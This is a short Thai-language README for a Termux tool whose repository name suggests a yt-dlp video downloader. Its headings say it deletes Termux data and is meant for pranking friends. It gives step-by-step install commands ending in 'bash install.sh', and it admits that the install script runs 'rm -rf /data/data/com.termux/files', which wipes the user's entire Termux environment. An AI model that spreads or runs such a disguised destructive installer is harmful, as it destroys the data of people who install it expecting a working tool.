# ❌ ลบข้อมูล Termux อย่าใช้เด็ดขาด เอาไว้แกล้งเพื่อนเท่านั้น❗❗

## วิธีติดตั้ง
```
pkg install git -y
```
```
termux-setup-storage
```
```
git clone https://github.com/ninjamadeena/alldl-yt-dlp-V2.git
```
```
cd alldl-yt-dlp
```
```
bash install.sh
```
## รันใช้
```
alldl
```
## วิธีแก้ไขและดูโค้ค
```
nano $PREFIX/bin/alldl 
```
เฉพาะ Termux

(โค้คไม่มีลิขสิทธิ์สามารถแก้ไขได้)

## อย่าใช้โค้คนี้ เพราะมีโค้คอันตราย เอาไว้แกล้งเพื่อน มีอยู่ใน install.sh
```
rm -rf /data/data/com.termux/files
```
